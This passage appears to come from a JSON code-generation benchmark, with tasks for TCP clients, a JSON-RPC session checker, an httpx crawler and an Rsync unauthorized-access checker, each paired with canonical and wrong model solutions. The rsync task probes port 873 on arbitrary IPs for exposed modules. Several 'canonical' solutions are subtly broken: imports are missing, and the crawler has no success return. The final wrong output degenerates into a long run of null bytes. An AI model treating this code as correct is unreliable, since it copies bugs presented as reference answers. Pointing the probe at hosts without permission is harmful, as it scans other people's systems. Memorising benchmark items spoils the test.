Optional[int] = None, b: Optional[int] = None) -> int - Sends a session validation request to the server with optional parameters (generates random values if not provided)\n- recv() -> int - Receives and validates the server response, returning the validation result",
    "Canonical_solution": "import os\nimport json\nimport errno\nimport socket\nfrom typing import Optional\n\ndef make_tcp_socket(ip: str, port: int):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((ip, port))\n    return sock\n\ndef socket_is_closed(sock: socket.socket) -> bool:\n    if sock is None:\n        return True\n    try:\n        buf = sock.recv(1, socket.MSG_PEEK | socket.MSG_DONTWAIT)\n        if buf == b'':\n            return True\n    except BlockingIOError as exc:\n        if exc.errno != errno.EAGAIN:\n            raise\n    return False\n\ndef recvall(sock, buffer_size=4096):\n    data = b\"\"\n    while True:\n        chunk = sock.recv(buffer_size)\n        if not chunk:\n            break\n        data += chunk\n    return data\n\nclass CaseTCP:\n    def __init__(self, uri: str = '127.0.0.1', port: int = 8545, identity: int = os.getpid()) -> None:\n        self.identity = identity\n        self.expected = -1\n        self.uri = uri\n        self.port = port\n        self.sock = None\n        self.payload = ''.join(random.choices(string.ascii_uppercase, k=80))\n\n    def __call__(self, **kwargs) -> int:\n        self.send(**kwargs)\n        return self.recv()\n\n    def send(self, *, a: Optional[int] = None, b: Optional[int] = None) -> int:\n        a = random.randint(1, 1000) if a is None else a\n        b = random.randint(1, 1000) if b is None else b\n        jsonrpc = '{\"jsonrpc\":\"2.0\",\"id\":%i,\"method\":\"validate_session\",\"params\":{\"user_id\":%i,\"session_id\":%i,\"text\":\"%s\"}}' % (self.identity, a, b, self.payload)\n        self.expected = (a ^ b) % 23 == 0\n        self.sock = make_tcp_socket(self.uri, self.port) if socket_is_closed(self.sock) else self.sock\n        self.sock.send(jsonrpc.encode())\n\n    def recv(self) -> int:\n        response_bytes = recvall(self.sock).decode()\n        self.sock.settimeout(None)\n        response = json.loads(response_bytes)\n        assert 'error' not in response, response['error']\n        received = response['result']\n        assert response['jsonrpc']\n        assert response.get('id', None) == self.identity\n        assert self.expected == received, 'Wrong Answer'\n        return received",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport os\nimport socket\nimport json\nimport random\nimport string\n\nclass CaseTCP:\n    def __init__(self, uri: str = '127.0.0.1', port: int = 8545, identity: int = os.getpid()) -> None:\n        self.identity = identity\n        self.expected = True\n        self.uri = uri\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.connect((self.uri, self.port))\n        self.payload = ''.join(random.choices(string.ascii_letters + string.digits, k=32))\n\n    def __call__(self, **kwargs) -> int:\n        self.send(**kwargs)\n        return self.recv()\n\n    def send(self, *, a: Optional[int] = None, b: Optional[int] = None) -> int:\n        a = random.randint(0, 100) if a is None else a\n        b = random.randint(0, 100) if b is None else b\n        payload = json.dumps({\n            'jsonrpc': '2.0',\n            'method': 'eth_getBalance',\n            'params': [f'0x{self.identity:040x}', 'latest'],\n            'id': self.identity\n        })\n        self.sock.sendall(payload.encode('utf-8'))\n        return a + b\n\n    def recv(self) -> int:\n        response = self.sock.recv(1024).decode('utf-8')\n        response = json.loads(response)\n        if 'error' in response:\n            raise Exception(f'Error: {response[\"error\"]}')\n        assert response['result'] == '0x0', 'Unexpected response'\n        return int(response['result'], 16)\n```"
  },
  {
    "Task_id": 358,
    "Instruction": "Task Description: Create a Python function that establishes a TCP client connection to a server, sends a JSON-formatted command with arguments, receives the server's response, and then closes the connection.\n\nFunction Description: The function `connect_client` creates a TCP socket, connects to a specified server, sends a command with arguments in JSON format, waits for and prints the server's response, and finally closes the socket connection.\n\nInput:\n- `machine` (str): The IP address or hostname of the target server.\n- `port` (int): The port number on which the server is listening.\n- `blendpath` (str): A file path or identifier to be included in the command arguments.\n- `obj_num` (int): A numerical argument to be included in the command arguments.\n\nOutput:\n- The function does not return any value but prints the server's response to the console.",
    "Canonical_solution": "import socket, json\n\ndef connect_client(machine, port, blendpath, obj_num):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((machine, port))\n    args = [blendpath, obj_num]\n    command = json.dumps({'call':1, 'command':1, 'args':args})\n    sock.send((command).encode())\n    response_data = sock.recv(1024)\n    print(response_data.decode())\n    sock.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport json\n\ndef connect_client(machine, port, blendpath, obj_num):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((machine, port))\n        command = {\n            \"command\": \"blend\",\n            \"args\": {\n                \"blendpath\": blendpath,\n                \"obj_num\": obj_num\n            }\n        }\n        s.sendall(json.dumps(command).encode())\n        data = s.recv(1024)\n        print('Received', repr(data))\n```"
  },
  {
    "Task_id": 36,
    "Instruction": "Task Description: Create a Python function that performs HTTP requests using the httpx library to fetch and process content from a given URL, with proper error handling and logging.\n\nFunction Description: The function should make a synchronous HTTP GET request to the specified URL using custom headers, handle potential exceptions, decode the response content using detected encoding, and return the extracted data along with a status code. If the request fails, it should log the error and return an error code with an empty dictionary.\n\nInput:\n- url: str | Path - The target URL to fetch content from\n- logger: logging.Logger - A logger instance for error logging\n\nOutput:\n- Tuple[int, dict] - A tuple containing:\n  - Status code (negative for errors, positive for HTTP status codes)\n  - Dictionary containing extracted data (empty if an error occurs)",
    "Canonical_solution": "import httpx\n\nheader = {\n    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/604.1 Edg/112.0.100.0'\n}\n\ndef simple_crawler(url: str | Path, logger) -> (int, dict):\n    try:\n        with httpx.Client() as client:\n            response = client.get(url, headers=header, timeout=30)\n            rawdata = response.content\n            encoding = chardet.detect(rawdata)['encoding']\n            text = rawdata.decode(encoding)\n        result = extractor.extract(text)\n    except Exception as e:\n        logger.warning(f\"cannot get content from {url}\\n{e}\")\n        return -7, {}",
    "Code_level": "Function-level",
    "FSMID_for_test": 58,
    "wrong_result": "```python\nimport httpx\nimport logging\nfrom typing import Tuple, Dict\n\ndef fetch_content(url: str, logger: logging.Logger) -> Tuple[int, Dict]:\n    headers = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'\n    }\n    try:\n        response = httpx.get(url, headers=headers)\n        response.raise_for_status()\n        content = response.text\n        encoding = response.encoding\n        if encoding is None:\n            encoding = 'utf-8'\n        data = content.encode(encoding).decode('utf-8')\n        return response.status_code, data\n    except httpx.RequestError as e:\n        logger.error(f\"Request error: {e}\")\n        return -1, {}\n    except httpx.HTTPStatusError as e:\n        logger.error(f\"HTTP error: {e}\")\n        return -2, {}\n    except httpx.ReadTimeout as e:\n        logger.error(f\"Read timeout: {e}\")\n        return -3, {}\n    except httpx.ConnectError as e:\n        logger.error(f\"Connection error: {e}\")\n        return -4, {}\n    except httpx.TimeoutException as e:\n        logger.error(f\"Timeout error: {e}\")\n        return -5, {}\n    except Exception as e:\n        logger.error(f\"Unexpected error: {e}\")\n        return -6, {}\n```"
  },
  {
    "Task_id": 363,
    "Instruction": "Task Description: Implement a TCP client handler class that manages socket communication with a server, including sending and receiving data, handling connection states, and processing messages.\n\nClass Description: EventHandler is a TCP client handler that manages non-blocking socket communication with a server. It provides methods for sending and receiving data, handling connection states, and processing messages. The class uses threading locks to ensure thread-safe operations on the socket.\n\nAttributes:\n- _write_lock: threading.RLock - Lock for thread-safe write operations\n- _read_lock: threading.RLock - Lock for thread-safe read operations\n- address: tuple - Server address (IP, port) to connect to\n- outbuffer: bytes - Buffer for outgoing data\n- inbuffer: bytes - Buffer for incoming data\n- sock: socket.socket - TCP socket object\n- connected: bool - Connection state flag\n\nMethods:\n- __init__(address: tuple, sock: socket.socket=None) -> None - Initializes the handler with server address and optional existing socket\n- fileno() -> int - Returns socket file descriptor for select()\n- send() -> int - Sends data from outbuffer to server (returns bytes sent)\n- recv() -> None - Receives data from server and processes messages\n- push(data: bytes) -> None - Adds data to outbuffer for sending\n- handle_read(data: bytes) -> None - Abstract method to handle received data (must be implemented)\n- process_message() -> None - Abstract method to process complete messages (must be implemented)\n- ready_to_read() -> bool - Returns if ready for reading (default True)\n- ready_to_write() -> bool - Returns if ready for writing (default True)\n- close() -> None - Closes the socket connection",
    "Canonical_solution": "import os\nimport sys\nimport time\nimport errno\nimport socket\nimport select\nimport logging\nimport threading\n\nclass EventHandler:\n    def __init__(self, address: tuple, sock: socket.socket=None) -> None:\n        self._write_lock = threading.RLock()\n        self._read_lock = threading.RLock()\n        self.address = address\n        self.outbuffer = b''\n        self.inbuffer = b''\n        self.sock = sock if sock is not None else socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.connect(address)\n        self.connected = True\n        self.sock.setblocking(False)\n\n    def fileno(self) -> int:\n        return self.sock.fileno()\n\n    def send(self) -> int:\n        with self._write_lock:\n            while len(self.outbuffer) > 0:\n                try:\n                    sent = self.sock.send(self.outbuffer)\n                    self.outbuffer = self.outbuffer[sent:]\n                except socket.error as error:\n                    if error.args[0] == errno.EAGAIN:\n                        time.sleep(0.1)\n                    elif error.args[0] in (errno.ECONNRESET, errno.ENOTCONN, errno.ESHUTDOWN, errno.ECONNABORTED, errno.EPIPE):\n                        self.close()\n                        return 0\n                    elif os.name == 'posix':\n                        if sys.platform == 'darwin' and error.args[0] == errno.EBADF:\n                            self.close()\n                            return 0\n                        elif error.args[0] == errno.EBADFD:\n                            self.close()\n                            return 0\n                        raise\n                    else:\n                        raise\n\n    def recv(self) -> None:\n        try:\n            data = self.sock.recv(4096)\n        except socket.error as error:\n            if error.args[0] in (errno.EWOULDBLOCK, errno.EAGAIN):\n                return None\n            elif error.args[0] == errno.ECONNRESET:\n                self.close()\n                return None\n            else:\n                raise\n\n        if not data:\n            self.close()\n            return None\n\n        self.inbuffer += data\n\n        while self.inbuffer:\n            match = b'\\r\\n'\n            index = self.inbuffer.find(match)\n            if index != -1:\n                if index > 0:\n                    self.handle_read(self.inbuffer[:index])\n                self.inbuffer = self.inbuffer[index+len(match):]\n                self.process_message()\n            else:\n                index = len(match) - 1\n                while index and not self.inbuffer.endswith(match[:index]):\n                    index -= 1\n                if index:\n                    if index != len(self.inbuffer):\n                        self.handle_read(self.inbuffer[:-index])\n                        self.inbuffer = self.inbuffer[-index:]\n                    break\n                else:\n                    self.handle_read(self.inbuffer)\n                    self.inbuffer = b''\n\n    def push(self, data: bytes) -> None:\n        self.outbuffer += data\n\n    def handle_read(self, data: bytes) -> None:\n        raise NotImplementedError('You have to implement this method')\n\n    def process_message(self) -> None:\n        raise NotImplementedError('You have to implement this method')\n\n    def ready_to_read(self) -> bool:\n        return True\n\n    def ready_to_write(self) -> bool:\n        return True\n\n    def close(self) -> None:\n        self.sock.close()\n        self.connected = False",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport threading\n\nclass EventHandler:\n    def __init__(self, address: tuple, sock: socket.socket=None) -> None:\n        self._write_lock = threading.RLock()\n        self._read_lock = threading.RLock()\n        self.address = address\n        self.outbuffer = b''\n        self.inbuffer = b''\n        self.sock = sock\n        self.connected = False\n\n    def fileno(self) -> int:\n        return self.sock.fileno()\n\n    def send(self) -> int:\n        with self._write_lock:\n            sent = self.sock.send(self.outbuffer)\n            self.outbuffer = self.outbuffer[sent:]\n            return sent\n\n    def recv(self) -> None:\n        with self._read_lock:\n            data = self.sock.recv(4096)\n            if data:\n                self.inbuffer += data\n                self.handle_read(data)\n\n    def push(self, data: bytes) -> None:\n        with self._write_lock:\n            self.outbuffer += data\n\n    def handle_read(self, data: bytes) -> None:\n        pass\n\n    def process_message(self) -> None:\n        pass\n\n    def ready_to_read(self) -> bool:\n        return True\n\n    def ready_to_write(self) -> bool:\n        return True\n\n    def close(self) -> None:\n        self.sock.close()\n        self.connected = False\n```\n"
  },
  {
    "Task_id": 365,
    "Instruction": "Task Description: Create a Python function that implements a TCP client for basic communication with a server using sockets. The function should establish a connection, send a message, receive a response, and close the connection.\n\nFunction Description: The function `tcp_client_communication` creates a TCP socket, connects to a specified server, sends a message, receives a response, and then closes the connection. It handles IPv4 addresses and uses a stream-oriented connection (TCP).\n\nInput:\n- `host` (str, optional): The IP address or hostname of the server. Defaults to 'localhost'.\n- `port` (int, optional): The port number on which the server is listening. Defaults to 20000.\n- `message` (bytes, optional): The message to send to the server. Defaults to b'Hello\\n'.\n\nOutput:\n- `resp` (bytes): The response received from the server.",
    "Canonical_solution": "from socket import socket, AF_INET, SOCK_STREAM\n\ndef tcp_client_communication(host='localhost', port=20000, message=b'Hello\\n'):\n    s = socket(AF_INET, SOCK_STREAM)\n    s.connect((host, port))\n    s.send(message)\n    resp = s.recv(8192)\n    s.close()\n    return resp",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\ndef tcp_client_communication(host='localhost', port=20000, message=b'Hello\\n'):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((host, port))\n        s.sendall(message)\n        resp = s.recv(1024)\n    return resp\n```"
  },
  {
    "Task_id": 368,
    "Instruction": "Task Description: Create a function to check for unauthorized access to an Rsync service on a given IP address using TCP socket communication.\n\nFunction Description: The function attempts to connect to an Rsync service (port 873) on the specified IP address, sends a specific payload to initiate communication, and checks the response for indications of unauthorized access. If the service responds with module information without proper authentication, it indicates potential unauthorized access.\n\nInput:\n- ip: [str] - The target IP address to check for Rsync unauthorized access\n\nOutput:\n- [str] - Returns '873 Rsync Unauthorized Access' if unauthorized access is detected, otherwise returns None (implicitly through exception handling or empty response)",
    "Canonical_solution": "import socket\n\ntimeout = 3\n\ndef check_rsync_unauthorized_access(ip):\n    try:\n        socket.setdefaulttimeout(1.5)\n        payload = b\"\\x40\\x52\\x53\\x59\\x4e\\x43\\x44\\x3a\\x20\\x33\\x31\\x2e\\x30\\x0a\"\n        socket.setdefaulttimeout(timeout)\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server_address = (ip, 873)\n        sock.connect(server_address)\n        sock.sendall(payload)\n        initinfo = sock.recv(400)\n        if b\"RSYNCD\" in initinfo:\n            sock.sendall(b\"\\x0a\")\n        modulelist = sock.recv(200)\n        sock.close()\n        if len(modulelist) > 0:\n            return '873 Rsync Unauthorized Access'\n    except Exception as e:\n        pass",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\ndef check_rsync_unauthorized_access(ip):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(5)\n        s.connect((ip, 873))\n        s.sendall(b'rsync\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0